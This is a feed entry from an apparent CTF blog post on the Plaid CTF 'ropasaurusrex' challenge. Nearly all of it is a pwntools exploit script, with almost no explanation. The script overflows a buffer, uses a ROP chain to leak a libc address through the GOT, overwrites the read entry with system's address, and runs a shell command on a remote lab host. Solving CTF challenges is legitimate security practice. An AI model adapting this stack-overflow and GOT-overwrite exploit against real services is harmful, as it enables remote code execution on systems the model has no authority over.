    <entry>
      <title>Plaid CTF - ropasaurusrex</title>
      <link href="/2018/09/24/ropp/"/>
      <url>/2018/09/24/ropp/</url>
      
        <content type="html"><![CDATA[<p>.</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">s = remote(&quot;192.168.111.100&quot;, 12317)</span><br><span class="line"> </span><br><span class="line">e = ELF(&quot;./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d&quot;)</span><br><span class="line">pppr = 0x80484b6</span><br><span class="line">cmd = &apos;id\x00&apos;</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;*140</span><br><span class="line">payload += p32(e.plt[&apos;read&apos;]) + p32(pppr) +p32(0)+ p32(e.bss())+p32(len(cmd))</span><br><span class="line">payload += p32(e.plt[&apos;write&apos;]) +p32(pppr)+ p32(1) +p32(e.got[&apos;read&apos;])+p32(4)</span><br><span class="line">payload += p32(e.plt[&apos;read&apos;]) + p32(pppr) +p32(0)+ p32(e.got[&apos;read&apos;])+p32(4)</span><br><span class="line">payload += p32(e.plt[&apos;read&apos;]) + &quot;dddd&quot; + p32(e.bss())</span><br><span class="line"> </span><br><span class="line">s.send(payload);sleep(0.1)</span><br><span class="line">s.send(cmd)</span><br><span class="line">readgot = s.recv(4)</span><br><span class="line">system = u32(readgot) - 0x9AC50</span><br><span class="line">sleep(0.3)</span><br><span class="line">s.send(p32(system));sleep(0.3)</span><br><span class="line">sleep(1)</span><br><span class="line">print s.recv(1024)</span><br></pre></td></tr></table></figure>]]></content>
      
      
